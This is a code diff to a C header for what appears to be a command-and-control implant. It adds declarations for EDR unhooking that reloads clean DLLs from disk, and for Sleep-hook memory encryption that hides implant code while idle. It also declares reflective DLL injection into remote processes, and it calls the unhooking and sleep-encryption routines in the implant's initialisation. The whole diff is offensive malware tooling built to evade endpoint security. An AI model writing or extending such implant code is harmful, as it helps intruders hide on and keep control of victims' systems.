@@ -63,6 +63,30 @@ BOOL BofExecute(const BYTE *coff_data, SIZE_T coff_size,
                 char *args, int args_len,
                 char **out_buf, SIZE_T *out_len);
 
+/* ── evasion/pe_refresh.c (PEzor/loader.c — phra, MIT) ──────────────────── */
+/* Iterates all loaded DLLs, reloads clean copies from disk, overwrites
+ * any modified (hooked) .text sections. Covers all EDR-hooked DLLs,
+ * not just ntdll.                                                          */
+VOID RefreshPE(void);
+
+/* ── evasion/fluctuate.cpp (PEzor — phra, MIT) ──────────────────────────── */
+/* Installs a Sleep() trampoline hook. On every Sleep call from implant
+ * memory: XOR-encrypts the full allocation, flips page to PAGE_NOACCESS
+ * (FLUCTUATE_NA) or PAGE_READWRITE (FLUCTUATE_RW), sleeps, then restores
+ * on resume (RW) or via VEH on first-access fault (NA).
+ * Result: no readable implant .text while sleeping.                        */
+void fluctuate(void);
+
+/* ── injection/LoadLibraryR.c (Stephen Fewer, Harmony Security, BSD-3) ──── */
+/* Canonical reflective DLL injection loader. Payload DLL must export
+ * "ReflectiveLoader" (compiled with ReflectiveLoader.c).                   */
+HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength,
+                             LPCSTR cpReflectiveLoaderName);
+HANDLE  WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer,
+                                  DWORD dwLength,
+                                  LPCSTR cpReflectiveLoaderName,
+                                  LPVOID lpParameter);
+
 /* ── ImplantInit — convenience wrapper ──────────────────────────────────── */
 static inline BOOL ImplantInit(void)
 {
@@ -70,5 +94,9 @@ static inline BOOL ImplantInit(void)
     SpoofInit();       /* non-fatal if no gadget found */
     HwBpBypassInit();  /* non-fatal */
     FoliageInit();     /* non-fatal — FoliageSleep falls back to plain Sleep */
+    RefreshPE();       /* unhook all EDR-hooked DLLs from clean disk copies */
+#ifdef SLEEP_FLUCTUATE
+    fluctuate();       /* install Sleep() hook XOR encryptor (PEzor variant) */
+#endif
     return TRUE;
 }
